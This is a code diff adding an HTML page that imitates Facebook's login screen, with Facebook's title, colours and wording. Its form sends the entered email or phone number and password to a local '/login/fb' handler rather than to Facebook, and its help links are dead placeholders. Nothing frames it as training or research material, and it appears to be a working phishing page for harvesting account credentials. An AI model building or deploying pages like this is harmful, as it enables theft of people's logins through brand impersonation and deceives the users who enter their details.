@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
+        .fb-box{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);width:396px}
+        .fb-box h1{color:#1877f2;font-size:40px;text-align:center;margin-bottom:20px}
+        input{width:100%;padding:14px 16px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px}
+        input:focus{border-color:#1877f2;outline:none}
+        button{width:100%;padding:14px;background:#1877f2;border:none;border-radius:6px;color:#fff;font-size:20px;font-weight:700;cursor:pointer;margin:10px 0}
+        button:hover{background:#166fe5}
+        a{display:block;text-align:center;color:#1877f2;text-decoration:none;font-size:14px;margin:15px 0}
+        hr{border:none;border-top:1px solid #dadde1;margin:20px 0}
+        .create-btn{display:block;width:fit-content;margin:0 auto;padding:14px 40px;background:#42b72a;border:none;border-radius:6px;color:#fff;font-size:17px;font-weight:700;cursor:pointer}
+        .create-btn:hover{background:#36a420}
+    </style>
+</head>
+<body>
+<div class="fb-box">
+    <h1>facebook</h1>
+    <form method="POST" action="/login/fb">
+        <input type="text" name="username" placeholder="Email or phone number" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+        <a href="#">Forgotten password?</a>
+        <hr>
+        <a href="#" class="create-btn">Create New Account</a>
+    </form>
+</div>
+</body>
+</html>
